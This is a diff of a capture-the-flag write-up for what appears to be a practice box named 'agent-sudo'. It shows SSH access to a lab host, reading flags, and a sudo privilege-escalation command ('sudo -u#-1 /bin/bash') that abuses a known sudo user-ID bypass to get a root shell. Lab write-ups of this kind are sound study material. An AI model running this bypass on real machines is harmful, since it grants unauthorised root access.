@@ -94,10 +94,10 @@ ssh james@10.10.20.48
 ```
 ![image](https://github.com/lufffe/Writeups/assets/90646635/f488accb-48ed-496f-b3af-e55bcee36c0e)
 
+* ### Flag User.
 ```bash
 cat user_flag.txt
 ```
-> ##################################
 
 ```bash
 sudo -l
@@ -109,3 +109,7 @@ james@agent-sudo:~$ sudo -u#-1 /bin/bash
 ```
 ![image](https://github.com/lufffe/Writeups/assets/90646635/8607e831-f124-42bf-aab4-2662af23ffdc)
 
+* ### Flag Root.
+```bash
+cat /root/root.txt
+```
